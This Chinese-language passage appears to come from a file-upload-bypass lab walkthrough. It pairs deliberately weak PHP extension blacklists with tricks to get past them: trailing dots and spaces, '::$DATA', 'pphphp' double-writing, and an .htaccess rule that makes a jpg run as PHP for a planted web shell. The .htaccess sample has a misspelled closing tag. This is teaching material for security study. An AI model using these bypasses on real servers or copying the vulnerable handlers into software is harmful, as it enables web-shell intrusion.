&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>利用Windows的特性，以上代码中没有对点进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure>

<p>这里我们把上传的文件后面加一个点即可绕过，例如<code>test.php.</code></p>
<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>在Windows中文件后缀名末尾有空格会自动去掉</p>
<p>例如<code>test.php </code>,在Windows中会自动去掉末尾的空格变成<code>test.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>以上代码中没有对空格进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>这里我们构造文件名<code>tets.php </code>，在最后添加一个空格即可绕过</p>
<h5 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h5><p>利用Windows+php的特性，如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p>
<p>例如:<code>&quot;test.php::$DATA&quot;</code>Windows会自动去掉末尾的<code>::$DATA</code>变成<code>&quot;test.php&quot;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>以上代码中没有对<code>::$DATA</code>进行处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>这里我们把上传的文件抓包，在最后添加<code>::$DATA</code>即可绕过，如<code>test.php::$DATA</code></p>
<h5 id="路径拼接绕过"><a href="#路径拼接绕过" class="headerlink" title="路径拼接绕过"></a>路径拼接绕过</h5><p>在代码中，会对文件名进行处理，删除了文件名末尾的点，进行去空处理等，再把处理过的文件名拼接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>这里我们构造文件名<code>test.php. .</code>(点+空格+点)，经过处理后。文件名变成<code>test.php.</code>，即可绕过</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>代码会将不符合的文件名和扩展名进行去除</p>
<p>例如<code>test.php</code>会变成<code>test.</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>我们这里构造文件名为<code>test.pphphp</code>，这样消除之后就会变成<code>test.php</code>，会把所有带php的文件名和扩展名进行消除</p>
<h5 id="上传-htaccess"><a href="#上传-htaccess" class="headerlink" title="上传.htaccess"></a>上传.htaccess</h5><p>​        .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>绕过方法</strong></p>
<p>服务器禁止了几乎所有的类型文件的后缀，可以通过.htaccess解析进行绕过</p>
<p>上传.htaccess文件，.htaccess文件代码如下</p>
<p>下面代码说明服务器解析1.jpg文件当作php运行，也可以不加1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;1.jpg&quot;&gt;  </span><br><span class="line">SetHandler  application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatchc&gt;</span><br></pre></td></tr></table></figure>

<p>当把有如上代码的.htaccess文件上传，在上传有木马代码的1.jpg文件上传，即可使用工具链接</p>
<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容"></a>检查内容</h3><h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>这里主要对文件的前两个字节来判断文件的上传类型</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span 